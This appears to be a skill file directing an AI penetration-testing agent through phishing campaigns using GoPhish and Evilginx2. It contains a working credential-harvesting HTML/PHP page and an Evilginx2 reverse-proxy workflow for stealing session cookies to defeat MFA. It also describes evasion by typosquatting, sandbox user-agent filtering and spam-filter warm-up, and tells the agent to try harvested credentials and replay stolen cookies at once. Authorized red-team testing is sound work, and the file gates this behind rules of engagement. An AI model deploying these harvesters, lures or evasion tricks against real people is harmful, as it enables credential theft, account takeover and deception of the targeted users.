---
name: Phishing Campaigns
description: Setup and execution of phishing campaigns, credential harvesting, and awareness testing using GoPhish, Evilginx, and custom landing pages
---

# Phishing Campaigns

Pull this skill when the ROE explicitly authorizes social engineering testing and you need to design, deploy, and manage a phishing campaign against target users.

> **⚠️ ROE REQUIRED**: Phishing is restricted by default in the agent settings (`phishing_social_engineering: false` until toggled on). This skill must NOT be activated without explicit authorization in the Rules of Engagement.

## Tool wiring

| Action | Tool | Notes |
|--------|------|-------|
| Campaign management | `kali_shell` — `gophish` | Web UI for campaign lifecycle |
| Reverse proxy phishing | `kali_shell` — `evilginx2` | Subdomain, credential + 2FA token capture |
| Landing page creation | `kali_shell` — `gophish`, `evilginx2` | Clone target login pages |
| Email delivery | `kali_shell` — `gophish`, `sendmail` | SMTP relay configuration |
| Payload hosting | `kali_shell` — `python3 -m http.server` | Simple HTTP server for hosting |
| Certificate setup | `kali_shell` — `letsencrypt`, `openssl` | HTTPS for landing pages |

> **Availability**: GoPhish and Evilginx2 may need to be downloaded/installed. Python3 HTTP server is pre-installed.

## Primer

Phishing campaigns test the human element of security. The core components are:
1. **Landing page** — a convincing replica of the target service's login page
2. **Email template** — the lure that brings users to the landing page
3. **Campaign management** — tracking who clicked, submitted credentials, etc.
4. **SMTP relay** — sending the emails (requires careful configuration to avoid spam filters)

## GoPhish setup

### Install and start GoPhish
```bash
# Download GoPhish
wget -O /tmp/gophish.zip https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip /tmp/gophish.zip -d /opt/gophish
chmod +x /opt/gophish/gophish

# Edit config (set server bind address for remote access)
# /opt/gophish/config.json
# "admin_server": { "listen_url": "0.0.0.0:3333" }

# Start GoPhish
/opt/gophish/gophish &
```

### GoPhish configuration checklist
1. **Sending Profiles**: Configure SMTP (sender email, server, credentials)
2. **Landing Pages**: Import or create HTML login page, set capture credentials/redirect
3. **Email Templates**: Design the email with personalization fields (`{{.FirstName}}`, `{{.URL}}`)
4. **Target Groups**: Import CSV with Name, Email, and optional grouping
5. **Campaigns**: Combine all above, choose phishing URL, launch

### Landing page credential capture
```bash
# GoPhish handles this automatically when "Capture Credentials" is enabled
# POST data is stored in the GoPhish database under the campaign results

# For custom PHP landing page:
mkdir -p /var/www/html/phishing
cat > /var/www/html/phishing/index.html << 'EOF'
<html><body>
  <form method="post" action="capture.php">
    <input name="email" type="email" placeholder="Email">
    <input name="password" type="password" placeholder="Password">
    <button type="submit">Sign In</button>
  </form>
</body></html>
EOF

cat > /var/www/html/phishing/capture.php << 'EOF'
<?php
$log = fopen("creds.txt", "a");
fwrite($log, date("Y-m-d H:i:s") . " | " . $_POST['email'] . ":" . $_POST['password'] . "\n");
fclose($log);
header("Location: https://real-site.com/login");
?>
EOF
```

## Evilginx2 setup (2FA bypass)

Evilginx2 sits as a reverse proxy between the victim and the real site, capturing both credentials and session cookies (bypassing 2FA).

### Install and configure
```bash
# Download and build
git clone https://github.com/kgretzky/evilginx2 /opt/evilginx2
cd /opt/evilginx2
go build

# Start
./evilginx2
```

### Evilginx2 workflow
```
evilginx> config domain phish.example.com          # Your phishing domain
evilginx> config ip 203.0.113.50                   # Your VPS IP
evilginx> phishlets hostname outlook phish.example.com   # Host phishlet
evilginx> phishlets enable outlook                 # Enable the phishlet
evilginx> lures create outlook                     # Generate target URL
evilginx> lures get-url 0                          # The URL to send victims
```

> **Phishlets** are YAML configs that define how Evilginx2 proxies a specific target (Microsoft, Google, GitHub, etc.). Pre-built phishlets are in `/opt/evilginx2/phishlets/`.

## SMTP delivery configuration

### Use a legitimate SMTP relay (higher deliverability)
```bash
# GoPhish sending profile:
#   Host: smtp.sendgrid.net:587
#   Username: apikey
#   Password: SG.xxxxxxxxx
#   From: security@your-domain.com
```

### DIY SMTP server
```bash
# Install and configure Postfix for outbound only
apt install postfix
# Configure as "Satellite system" with smtp.your-provider.com as relayhost
```

### Email deliverability checklist
- [ ] SPF record for your sending domain: `v=spf1 include:sendgrid.net ~all`
- [ ] DKIM signing configured in GoPhish or SMTP server
- [ ] DMARC policy set to `p=none` (during testing)
- [ ] Warm up the sending IP if new (start with 50/day, ramp up)
- [ ] Avoid spam trigger words: "FREE", "Urgent", "Click here"
- [ ] Send from a domain similar to but not identical to the target (e.g., `security-target.com` impersonating `target.com`)

## Campaign timing strategy

| Day | Action | Emails sent |
|-----|--------|------------|
| 1 | Pillow talk (harmless newsletter) | 100 |
| 2 | Follow-up innocuous email | 100 |
| 3 | Main phishing email | All remaining |
| 4 | Reminder (for non-clickers) | Unopened only |
| 5 | Urgent follow-up | Unopened only |
| 7 | Campaign analysis and reporting | - |

## Detection avoidance

| Signal | Mitigation |
|--------|------------|
| Suspicious link domain | Register similar domain (homograph or typo-squatting) |
| Spam filter scoring | Pre-warm domain, avoid attachments, personalize heavily |
| Sandbox detection | Exclude headless/automated user-agents from landing page |
| Email tracking pixels | Use GoPhish's built-in open tracking (single pixel) |
| Browser password warnings | Use Let's Encrypt HTTPS on landing page |

## Validation shape

A phishing finding should include:
- **Campaign overview**: Emails sent, opened, clicked, credentials submitted
- **Technique**: Spear-phish, mass-phish, clone-phish, spear-phish with pretext
- **Payload**: Type of landing page, email template text (redacted for sensitivity)
- **Users impacted**: Count and roles of those who fell for the phish (anonymized in report)
- **Data compromised**: Credentials, session tokens, MFA codes captured
- **Timeline**: When emails sent, when first user clicked, total campaign duration

## False positives

- **Email not delivered**: Check SPF/DKIM/DMARC and sending reputation. Most "non-click" results are delivery failures, not user awareness.
- **Clicked but didn't submit credentials**: User may have realized it was a phish after clicking. Still counts as a training opportunity but not a full compromise.
- **Automated scanners clicking links**: Email security gateways (Proofpoint, Mimecast) scan links in all incoming email. Filter these from results using known scanner IP ranges.
- **Password autofill without submission**: Browser autofill fills the form fields but doesn't submit. Not a credential compromise unless the form POST was captured.

## Hand-off

- After harvesting credentials: Try them immediately —`-> /skill cloud/azure` (if Microsoft creds) or `-> /skill active_directory/ad_kill_chain` (if domain creds)
- For session cookie replay: Use the captured cookies directly in a browser session
- After initial access: `-> /skill post_exploitation/linux_privesc` or `-> /skill post_exploitation/windows_privesc`

## Pro tips

- **Timing matters**: Users are most likely to click phish between 9-11am local time on Tuesday-Thursday. Monday is too busy, Friday is checkout mode.
- **Pretext determines success**: "Your package delivery failed" or "Unusual sign-in detected" have 3-5x higher click rates than generic offers. Research the target to create convincing pretexts.
- **Evilginx2 beats MFA**: Standard credential phishing is mitigated by 2FA, but Evilginx2's reverse proxy approach captures session cookies, defeating TOTP, SMS, and push-based MFA.
- **Track opens carefully**: GoPhish's tracking pixel can be detected by privacy-focused email clients. Some organizations block remote images entirely.
- **GDPR/Privacy**: Do not store victim passwords in plaintext longer than necessary. Hash them after the campaign or store only the fact of submission, not the password value.
